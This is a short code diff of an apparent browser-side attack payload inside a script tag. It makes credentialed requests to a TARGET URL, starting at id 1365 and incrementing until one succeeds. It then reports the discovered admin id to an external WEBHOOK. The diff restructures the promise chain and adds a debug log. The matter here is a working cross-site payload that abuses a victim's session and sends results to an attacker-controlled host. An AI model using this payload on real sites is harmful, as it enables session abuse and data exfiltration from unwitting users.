@@ -13,22 +13,15 @@ let found = false;
 function tryId(i) {
     fetch(TARGET + i, {
         credentials: 'include'
-    })
-    .then(res => {
-        if (res.ok) {
-            fetch(WEBHOOK + "?admin=" + i);
-            return;
-        }
-        return res.text(); 
-    })
-    .then(data => {
-        if (data) {
-            tryId(i + 1);
-        }
-    })
-    .catch(() => {
+    }).then(res => {
+      if (res.ok) {
+        console.log("first condition");
         fetch(WEBHOOK + "?admin=" + i);
-    });
+      }
+      else {
+        tryId(i+1);
+      }
+    })
 }
 tryId(1365);
 </script>
